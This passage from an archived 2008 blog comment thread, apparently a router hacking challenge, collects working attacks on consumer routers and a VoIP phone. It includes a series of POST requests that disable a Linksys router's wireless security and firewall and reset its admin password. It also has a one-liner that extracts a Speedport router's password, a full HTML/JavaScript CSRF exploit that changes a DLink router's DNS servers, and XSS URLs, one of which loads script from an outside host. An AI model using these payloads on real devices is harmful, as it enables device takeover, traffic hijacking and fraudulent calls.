+POST /AdvRoute.tri action=Apply&#038;bSRoute=1&#038;oldOpMode=0&#038;wk_mode=0&#038;route_page=0&#038;route_name=&#038;route_ipaddr_0=0&#038;route_ipaddr_1=0&#038;route_ipaddr_2=0&#038;route_ipaddr_3=0&#038;route_netmask_0=0&#038;route_netmask_1=0&#038;route_netmask_2=0&#038;route_netmask_3=0&#038;route_gateway_0=0&#038;route_gateway_1=0&#038;route_gateway_2=0&#038;route_gateway_3=0&#038;route_ifname=0
+############################################################################
+Wireless-&gt;Basic Wireless Settings:
+POST /WBasic.tri submit_type=&#038;channelno=11&#038;OldWirelessMode=3&#038;Mode=3&#038;SSID=linksys&#038;channel=6&#038;Freq=6&#038;wl_closed=1&#038;sesMode=1&#038;layout=en
+############################################################################
+Wireless-&gt;Wireless Security:
+POST /Security.tri SecurityMode=0&#038;layout=en
+############################################################################
+Wireless-&gt;Wireless MAC Filter:
+POST /WFilter.tri wl_macmode1=0
+############################################################################
+Wireless-&gt;Advanced Wireless Settings:
+POST /Advanced.tri AuthType=0&#038;basicrate=default&#038;wl_rate=0&#038;wMode=3&#038;sectype=0&#038;ctspmode=off&#038;FrameBurst=off&#038;BeaconInterval=100&#038;Dtim=1&#038;FragLen=2346&#038;RTSThre=2347&#038;apisolation=0&#038;apSESmode=1
+############################################################################
+Security-&gt;Firewall:
+POST /fw.tri ident_pass=1&#038;action=Apply&#038;block_wan=1&#038;IGMP=1&#038;_ident_pass=1
+############################################################################
+Security-&gt;VPN:
+POST /vpn.tri action=Apply&#038;ipsec_pass=1&#038;pptp_pass=1&#038;l2tp_pass=1
+############################################################################
+Access Restrictions-&gt;Internet Access:
+POST /filter.tri action=Apply&#038;f_id=0&#038;f_status1=disable&#038;f_name=&#038;f_status2=1&#038;day_all=1&#038;time_all=1&#038;FROM_AMPM=0&#038;TO_AMPM=0&#038;blocked_service0=NONE&#038;blocked_service1=NONE&#038;host0=&#038;host1=&#038;host2=&#038;host3=&#038;url0=&#038;url1=&#038;url2=&#038;url3=&#038;url4=&#038;url5=
+############################################################################
+Applications &#038; Gaming-&gt;Port Range Forward:
+POST /PortRange.tri action=Apply&#038;RuleID_0=0&#038;name0=&#038;from0=0&#038;to0=0&#038;pro0=both&#038;ip0=0&#038;RuleID_1=0&#038;name1=&#038;from1=0&#038;to1=0&#038;pro1=both&#038;ip1=0&#038;RuleID_2=0&#038;name2=&#038;from2=0&#038;to2=0&#038;pro2=both&#038;ip2=0&#038;RuleID_3=0&#038;name3=&#038;from3=0&#038;to3=0&#038;pro3=both&#038;ip3=0&#038;RuleID_4=0&#038;name4=&#038;from4=0&#038;to4=0&#038;pro4=both&#038;ip4=0&#038;RuleID_5=0&#038;name5=&#038;from5=0&#038;to5=0&#038;pro5=both&#038;ip5=0&#038;RuleID_6=0&#038;name6=&#038;from6=0&#038;to6=0&#038;pro6=both&#038;ip6=0&#038;RuleID_7=0&#038;name7=&#038;from7=0&#038;to7=0&#038;pro7=both&#038;ip7=0&#038;RuleID_8=0&#038;name8=&#038;from8=0&#038;to8=0&#038;pro8=both&#038;ip8=0&#038;RuleID_9=0&#038;name9=&#038;from9=0&#038;to9=0&#038;pro9=both&#038;ip9=0
+############################################################################
+Applications &#038; Gaming-&gt;Port Triggering:
+POST /ptrigger.tri RuleID_0=&#038;service_name0=&#038;tfrom0=0&#038;tto0=0&#038;rfrom0=0&#038;rto0=0&#038;RuleID_1=&#038;service_name1=&#038;tfrom1=0&#038;tto1=0&#038;rfrom1=0&#038;rto1=0&#038;RuleID_2=&#038;service_name2=&#038;tfrom2=0&#038;tto2=0&#038;rfrom2=0&#038;rto2=0&#038;RuleID_3=&#038;service_name3=&#038;tfrom3=0&#038;tto3=0&#038;rfrom3=0&#038;rto3=0&#038;RuleID_4=&#038;service_name4=&#038;tfrom4=0&#038;tto4=0&#038;rfrom4=0&#038;rto4=0&#038;RuleID_5=&#038;service_name5=&#038;tfrom5=0&#038;tto5=0&#038;rfrom5=0&#038;rto5=0&#038;RuleID_6=&#038;service_name6=&#038;tfrom6=0&#038;tto6=0&#038;rfrom6=0&#038;rto6=0&#038;RuleID_7=&#038;service_name7=&#038;tfrom7=0&#038;tto7=0&#038;rfrom7=0&#038;rto7=0&#038;RuleID_8=&#038;service_name8=&#038;tfrom8=0&#038;tto8=0&#038;rfrom8=0&#038;rto8=0&#038;RuleID_9=&#038;service_name9=&#038;tfrom9=0&#038;tto9=0&#038;rfrom9=0&#038;rto9=0&#038;trinamelist=&#038;layout=en
+############################################################################
+Applications &#038; Gaming-&gt;DMZ:
+POST /dmz.tri action=Apply&#038;dmz_enable=0&#038;layout=en
+############################################################################
+Applications &#038; Gaming-&gt;QoS:
+POST /qos.tri hport_priority_1=0&#038;hport_priority_2=0&#038;hport_priority_3=0&#038;hport_priority_4=0&#038;hport_flow_control_1=1&#038;hport_flow_control_2=1&#038;hport_flow_control_3=1&#038;hport_flow_control_4=1&#038;happname1=&#038;hport1priority=0&#038;happport1=0&#038;happname2=&#038;hport2priority=0&#038;happport2=0&#038;happname3=&#038;hport3priority=0&#038;happport3=0&#038;happname4=&#038;hport4priority=0&#038;happport4=0&#038;happname5=&#038;hport5priority=0&#038;happport5=0&#038;happname6=&#038;hport6priority=0&#038;happport6=0&#038;happname7=&#038;hport7priority=0&#038;happport7=0&#038;happname8=&#038;hport8priority=0&#038;happport8=0&#038;QoS=0&#038;wl_wme=off&#038;layout=en
+############################################################################
+Administration-&gt;Management:
+POST /manage.tri remote_mgt_https=0&#038;http_enable=1&#038;https_enable=0&#038;PasswdModify=1&#038;http_passwd=d6nw5v1x2pc7st9m&#038;http_passwdConfirm=d6nw5v1x2pc7st9m&#038;_http_enable=1&#038;web_wl_filter=1&#038;remote_management=0&#038;upnp_enable=1&#038;layout=en
+############################################################################
+Administration-&gt;Log:
+POST /ctlog.tri log_enable=0
+############################################################################
+Administration-&gt;Diagnostics-&gt;Ping:
+POST /ping.tri action=start&#038;ping_ip=kinqpinz.info&#038;ping_times=5
+############################################################################
+Administration-&gt;Diagnostics-&gt;Trace Route:
+POST /tracert.tri action=start&#038;traceroute_ip=kinqpinz.info
+############################################################################
+Administration-&gt;Factory Defaults:
+############################################################################
+Administration-&gt;Firmware Upgrade:
+############################################################################
+Administration-&gt;Config Management:
+############################################################################
+Status-&gt;Router-&gt;DHCP Release:
+POST /rstatus.tri action=release&#038;wan_pro=0&#038;conn_stats=4294967295&#038;layout=en
+############################################################################
+Status-&gt;Router-&gt;DHCP Renew:
+POST /rstatus.tri action=renew&#038;wan_pro=0&#038;conn_stats=4294967295&#038;layout=en
+############################################################################
+Status-&gt;Local Network:
+############################################################################
+Status-&gt;Wireless:
+############################################################################</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-110201">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110201">
+			February 5, 2008 at 7:54 pm</a>		</div>
+
+		<p>marios&#8217;s <a href="http://sla.ckers.org/forum/read.php?13,20128,20229#msg-20229" rel="nofollow">submission</a> follows:</p>
+<pre><code>There's a VoIP solution called Snom 320 - more info on that beast here:
+[www.snom.com]
+
+It comes with a central phone server which features a web front-end. This
+thing can't be password protected - I don't know why but it just is that way.
+
+there's an input field labeled "Call a number" - and this is done via regular
+POST - no JS, no token - nothing. So - if you manage to get someone with this
+thing in his intranet to visit a prepared site of yours you can make his phone
+do loads of calls to everywhere in the world.
+
+[update]
+If you let the victim call yourself and you answer the phone you can hear the
+victim talk without knowing that you are listening. Well done, Snom :)
+[/update]
+
+But - you might say - the victim will notice when watching his logs! Nope - he
+won't. The logging application a a Flash file called snomControl.swf. If you
+call let's say 100 numbers in a place really far away you just have to make
+sure the last number you call is - tada:
+
+<strong>"');</strong>
+
+After that all other numbers that have ever been called aren't visible in the
+log anymore since the Flash app kind of crashes internally and only shows the
+calls made after the above mentioned one. I was too lazy to decompile it -
+maybe later.
+
+So - CSRF all over the place but isn't it boring to just get the user to make
+calls when he visits your prepared site? Yes - it is! You can CSRF a nice
+persistent XSS into the address book. So anytime the user visits it you can
+execute your script and do other stuff - like data mining, more calls, even
+some more calls and so on.
+
+There is XSS which also enables you to XHR yourself through the whole front-end
+and change arbitrary settings, like display names on the phone display, read
+out settings and anything else you want. Might be bad if you call your boss
+and some f-words appear on his display...
+
+Well, that's it for now - as said I dunno if this really counts but I consider
+it a funny find anyway ;)</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-110206">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/77c47d54a2c5ee8d235547949f931193?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://php-ids.org/' rel='external nofollow' class='url'>.mario</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110206">
+			February 5, 2008 at 8:12 pm</a>		</div>
+
+		<p>I wonder if the XSS will appear on our next phone bill ;)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-110214">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110214">
+			February 5, 2008 at 8:26 pm</a>		</div>
+
+		<p>I am not sure about this one but here is an idea: what if you fill it with space for padding and write your own phone bill :) I am not sure what you are going to use it for but still&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-110216">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/80d7b8935b953dabd63268177b7981f6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Ronald</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110216">
+			February 5, 2008 at 8:29 pm</a>		</div>
+
+		<p>Nice .mario! That is just badass incredible! hehe&#8230; good stuff so far.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-110217">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/77c47d54a2c5ee8d235547949f931193?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://php-ids.org/' rel='external nofollow' class='url'>.mario</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110217">
+			February 5, 2008 at 8:29 pm</a>		</div>
+
+		<p>Or maybe some ascii art :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-110219">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110219">
+			February 5, 2008 at 8:30 pm</a>		</div>
+
+		<p>yep, that too&#8230; :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-110225">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/691de8da509e7f1d427c69339b8facbb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">loftgaia</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110225">
+			February 5, 2008 at 8:48 pm</a>		</div>
+
+		<p>@Adrian &#8211; it&#8217;s amazing the flaws that one can find in these routers.That 2 years old, linksys flaw, is basically the same as this router&#8217;s.</p>
+<p>It&#8217;s alarming actually,to know that anyone can write an html page and obtain TOTAL control of my router.</p>
+<p>I hope this router-hacking challenge and your presentation at Dubai make people aware of how insecure some routers are.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-110282">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/add0049600466447c7ea247d3e3bd959?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://kbs.cs.tu-berlin.de/~seclab/' rel='external nofollow' class='url'>mutax</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110282">
+			February 5, 2008 at 10:32 pm</a>		</div>
+
+		<pre><code>bash one-liner for the Deutsche Telekom Speedport W500 DSL-Router (not the one running linux) to get the logon password from the - well - login-page:
+
+wget -q -O - 10.1.1.1/b_banner.stm  | sed -n "s/^pwd\ =\ '\(.*\)';/your routers password: \1/p"
+your routers password: xxxx
+
+That router seems to be a bug itself ;)
+
+mutax</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-110307">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110307">
+			February 5, 2008 at 11:22 pm</a>		</div>
+
+		<p>@meathive &#8211; that auth bypass issues appears to be the exact same finding published by Ginsu Rabbit which I mentioned on a previous comment: <a href="http://www.securityfocus.com/archive/1/442452/30/0/threaded" rel="nofollow">http://www.securityfocus.com/a.....0/threaded</a></p>
+<p>GS posted the &#8220;disable wireless setting&#8221; request which matches yours: </p>
+<pre><code>curl -d "SecurityMode=0&amp;layout=en" <a href="http://192.168.0.1/Security.tri" rel="nofollow">http://192.168.0.1/Security.tri</a></code></pre>
+<p>However, I must say that you documented your finding very nicely! Good job meathive!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-110315">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110315">
+			February 5, 2008 at 11:36 pm</a>		</div>
+
+		<p>@.mario &#8211; I&#8217;m wowed by your VoIP calls theft finding! wayyy cool stuff. you should find out if the IP phone responds to a certain domain name. i.e.: snom.phone</p>
+<p>also, please correct me if I&#8217;m wrong, but isn&#8217;t there an infamous Snom IP phone model that comes with a built-in sniffer that can be accessed via the web console? I remember seeing it on these VoIP security slides somewhere but can&#8217;t get hold of them. The slides even had a screenshot of the sniffing feature of the web console. Anyone seen this?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-110317">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110317">
+			February 5, 2008 at 11:38 pm</a>		</div>
+
+		<p>mutax, 10x for submitting this entry!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-110318">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110318">
+			February 5, 2008 at 11:38 pm</a>		</div>
+
+		<p>forgot to add :) </p>
+<p>if the Snom IP phone does respond to a certain domain name, then the attacker doesn&#8217;t need to predict the IP address of the device on the malicious page that causes the phone to call an arbitrary number!!!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-110321">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110321">
+			February 5, 2008 at 11:45 pm</a>		</div>
+
+		<p><a href="http://sla.ckers.org/forum/profile.php?13,755" rel="nofollow">Gareth Heyes</a> has <a href="http://sla.ckers.org/forum/read.php?13,20128,20229#msg-20243" rel="nofollow">submitted</a> the following entry:</p>
+<pre><code>I finally sat down and wrote a POC for my router, it's a DLink DSL-G604T. It's probably going in the bin after this :) I can read any
+file on the router remotely and the entire thing can be CSRF'd to death. In the sample code I show how to read the config file (or any other file)
+and change the DNS settings to anything you like.
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;DLink DSL-G604T Exploit&lt;/title&gt;
+&lt;script&gt;
+function readConfig() {
+	login();
+	setTimeout(function() {
+		xss('"&gt;&lt;iframe src="http://192.168.1.1/cgi-bin/webcm?getpage=/etc/config.xml" onload="alert(this.contentWindow.document.body.innerHTML);"&gt;');
+	}, 2000);
+}
+function xss(payload) {
+	ifrm = document.getElementById('iframe');
+	ifrm.contentWindow.location = 'http://192.168.1.1/cgi-bin/webcm?getpage=../html/advanced/portforw.htm&#038;var:pagename=fwan&#038;var:category='+payload;
+}
+function login() {
+	var f = document.createElement('form');
+	f.action = 'http://192.168.1.1/cgi-bin/webcm';
+	f.innerHTML = '&lt;input type="hidden" name="getpage" value="../html/home.htm"&gt;&lt;input type="hidden" name="errorpage" value="../html/index.html"&gt;';
+	f.innerHTML += '&lt;input type="hidden" name="login:command/username" value="admin"&gt;&lt;input type="hidden" name="login:command/password" value="admin"&gt;';
+	f.innerHTML += '&lt;input type="hidden" name="var:errormsg" value="Error"&gt;';
+	f.target = 'iframe';
+	f.method = 'post';
+	document.body.appendChild(f);
+	f.submit();
+}
+function post(url, fields) {
+	var p = document.createElement('form');
+	p.action = url;
+	p.innerHTML = fields;
+	p.target = 'iframe';
+	p.method = 'post';
+	document.body.appendChild(p);
+	p.submit();
+}
+function changeDNS(server) {
+	login();
+	setTimeout(function() {
+		var fields = '&lt;input type="hidden" name="getpage" value="../html/setup/dns.htm"&gt;';
+		fields += '&lt;input type="hidden" name="resolver:settings/nameserver1" value="'+server+'"&gt;';
+		fields += '&lt;input type="hidden" name="resolver:settings/nameserver2" value="'+server+'"&gt;';
+		fields += '&lt;input type="hidden" name="dproxy:settings/state" value="2"&gt;';
+		post('http://192.168.1.1/cgi-bin/webcm',fields);
+	}, 2000);
+	setTimeout(function() {
+		post('http://192.168.1.1/cgi-bin/webcm','&lt;input type="hidden" name="logic:command/save" value="../html/tools/syscommnd.htm"&gt;');
+	},5000);
+}
+window.onload = function() {
+	//readConfig();
+	changeDNS('2.2.2.2');
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;iframe name="iframe" id="iframe"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-110367">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/bb236a05eb6a86e4b3364cd0a71001c8?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://kinqpinz.info/' rel='external nofollow' class='url'>meathive</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110367">
+			February 6, 2008 at 1:49 am</a>		</div>
+
+		<p>I apologize for those of you unable to access my demo. My hosting provider has indefinitely shut down kinqpinz.info due to my router hacking post.</p>
+<p>I&#8217;ve asked on Ronald&#8217;s forum but would also like to here, if someone can recommend a hosting provider that doesn&#8217;t censor its members. I&#8217;d like to get back online as soon as possible.</p>
+<p>Thank you.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-110513">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110513">
+			February 6, 2008 at 8:51 am</a>		</div>
+
+		<p>posted by <a href="http://sla.ckers.org/forum/profile.php?13,577" rel="nofollow">beford</a> on <a href="http://sla.ckers.org/forum/read.php?13,20128,20229#msg-20255" rel="nofollow">sla.ckers.org</a>:</p>
+<pre><code>I'm using a ZyXEL P-660HW Series [www.zyxel.com] . There are a lot of CSRF stuff on this router, it can be used to change
+DNS servers, add keywords to bannedlist on URL, it's also affected by the IP-based session management attacks mentioned on gnucitizen,
+and to authenticate you only need a password, which by default is 'admin', I created two simple proof of concepts abusing a XSS flaw which
+requires the user to be logued on.
+
+hxtp&#58;//192.168.1.1/Forms/DiagGeneral_2?PingIPAddr=d=%3Cscript%20src%3Dhttp:%2f%2fbeford.org%2fstuff%2fr1.js%3E%3C%2fscript%3E
+hxtp&#58;//192.168.1.1/Forms/DiagGeneral_2?PingIPAddr=d=%3Cscript%20src%3Dhttp:%2f%2fbeford.org%2fstuff%2fr2.js%3E%3C%2fscript%3E
+
+Javascript source code, and two screenshots for reference:
+src: <a href="http://beford.org/stuff/r1.js" rel="nofollow">[beford.org]</a> shot: <a href="http://beford.org/stuff/img/r1.png" rel="nofollow">[beford.org]</a>
+src: <a href="http://beford.org/stuff/r2.js" rel="nofollow">[beford.org]</a> shot: <a href="http://beford.org/stuff/img/r2.png" rel="nofollow">[beford.org]</a></code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-110594">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110594">
+			February 6, 2008 at 11:41 am</a>		</div>
+
+		<p>@loftgaia &#8211; you&#8217;re so right. The vulnerabilties you can find are amazing. Many of these issues wouldn&#8217;t be foudn on regular web apps these days. However, because embedded devices are very primitive in regards to limited hardware, security is very often sacrificed.</p>
+<p>Changing DNS server settings without password! WOW! Through away your Belkin F5D7230-4 ASAP!</p>
+<p>I bet you can find many more issues, although at this point you owned your router completely since you proved any webpage can make any changes to it!!! :-)</p>
+<p>HTTP and related protocols such as UPnP really are the how hanging fruit of embedded devices security. I can&#8217;t believe that a router hacking challenge like this one hasn&#8217;t happened before.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-110597">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110597">
+			February 6, 2008 at 11:56 am</a>		</div>
+
+		<p>the router hacking challenge is going pretty well, don&#8217;t you think :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-110603">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110603">
+			February 6, 2008 at 12:00 pm</a>		</div>
+
+		<p>meathive, I went through the same experience as well. The best you can do is to get some VPS or a proper server hosting solution, or maybe even consider the options to host things yourself. You might want to check Amazon&#8217;s Simple Storage service, as it is very reliable and very, very cheap.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-110665">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110665">
+			February 6, 2008 at 2:44 pm</a>		</div>
+
+		<p>@pdp &#8211; the challenge really is going great! However, I think it&#8217;d be cool to think of it as an &#8220;embedded devices hacking challenge&#8221;, rather than focusing on *routers* only.</p>
+<p>Take .mario&#8217;s super cool VoIP theft hack. It&#8217;s a great finding but it&#8217;s on an IP phone rather than a router. We should definitely also promote hacking IP phones, cameras, printers and so on! The more variety, the more colorful the hacks will be!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-111308">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/45cc01128931896240c42edbed60a01f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://v-wall.co.uk/' rel='external nofollow' class='url'>v-wall</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111308">
+			February 7, 2008 at 3:24 pm</a>		</div>
+
+		<p><a href="http://blog.v-wall.co.uk/?p=60" rel="nofollow">http://blog.v-wall.co.uk/?p=60</a> &#8211; though I would direct any possible readers of my site into the game</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-111311">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111311">
+			February 7, 2008 at 3:43 pm</a>		</div>
+
+		<p>10x, v-wall</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-111338">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c970dee63fb8c2f40d17e04454742964?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Jonas</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111338">
+			February 7, 2008 at 5:01 pm</a>		</div>
+
+		<pre><code>I'm using a DLINK-DI604 router which is surely one of the most popular ones here where i live.
+The first thing i tried resulted in an XSS:
+
+http&#58;//192.168.0.1/prim.htm?rc=_&amp;rf="&gt;alert(1)
+
+I'll come back if i notice anything more.</code></pre>
